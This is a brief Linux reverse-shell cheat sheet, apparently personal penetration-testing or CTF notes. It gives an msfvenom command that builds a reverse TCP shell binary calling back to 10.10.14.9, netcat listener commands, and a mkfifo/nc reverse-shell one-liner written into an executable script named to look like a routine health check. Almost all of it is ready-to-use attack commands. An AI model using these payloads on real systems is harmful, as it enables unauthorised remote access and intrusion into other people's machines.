# Linux

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 PrependFork=true -o
rev
```

```bash
nc -nvlp 4444
```



Reverse shell netcat without -e

```bash
# Add reverse shell to shell script
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP>
9001 >/tmp/f" > /tmp/full-checkup.sh

# Change permissions
chmod +x /tmp/full-checkup.sh

# Listen
nc -nvlp 9001
```
